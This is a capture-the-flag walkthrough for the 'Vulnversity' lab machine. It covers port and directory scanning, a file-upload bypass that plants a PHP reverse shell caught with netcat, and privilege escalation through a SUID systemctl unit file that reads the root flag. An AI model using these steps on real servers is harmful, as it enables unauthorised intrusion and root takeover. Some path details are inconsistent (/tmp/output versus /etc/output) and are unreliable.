---
title: Vulnversity
created: '2020-05-10T16:09:08.192Z'
modified: '2020-05-10T21:58:37.303Z'
---

# Vulnversity

Perform a port scan

```
nmap -sV <IP>
```

Port **3333** cotains an HTTP web application

Scan the web application to find files and folders

```
gobuster -u http://<IP>:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e
```

There is a path to upload files to the web application

```
http://<IP>:3333/internal/
```

Testing for extensions of files allowed to be uploaded with Burp Intruder, we can identify that **.phtml** files are accepted.

Download a PHP reverse shell:
[Pentestmonkey - Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Edit the shell to include your local IP address and port (where netcat will be listening)

```
$ip = '127.0.0.1';
$port = 1234;
```

Upload the shell to the web application and use netcat to listen to the port specified in the shell

```
nc -lvp <port>
```

Access the path where the shell was uploaded on the web application to execute the PHP code in the reverse shell

```
http://<IP>:3333/internal/uploads/<path-to-shell>
```

User flag is found at /home/bill/user.txt

`8bd7992fbe8a6ad22a63361004cfcedb`

Search for files with the SUID bit enabled starting on / and redirect the errors to /dev/null

```
find / -perm /4000 2>/dev/null
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```

The **/bin/systemctl** executable has the SUID bit set

We can abuse it to elevate privileges.

[GTFOBins - Systemctl](https://gtfobins.github.io/gtfobins/systemctl/)

Systemd initializes user space components that run after the Linux kernel has booted, as well as continuously maintaining those components throughout a system’s lifecycle. These tasks are known as units, and each unit has a corresponding unit file. We can create our own unit file and let systemd start it. Normally systemctl will look for unit files in the default folder, which is /etc/system/systemd. But we don’t have the permission to write to that folder. Instead, we can use an environment variable that will read the contents of **/root/root.txt** and write its output to **/tmp/output** file.

First we create a variable which holds a unique file.

```
eop=$(mktemp).service
```

Then we create an unit file and write it into the variable.

```
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop
```

Inside the unit file we entered a command which will let shell execute the command cat and redirect the output of cat to a file called output in the folder tmp. And finally we use the /bin/systemctl program to enable the unit file.

```
/bin/systemctl link $eop
/bin/systemctl enable --now $eop
```

Finally we read the contents of the file **/etc/output**

`a58ff8579f0a9270368d33a9966c7fd5`

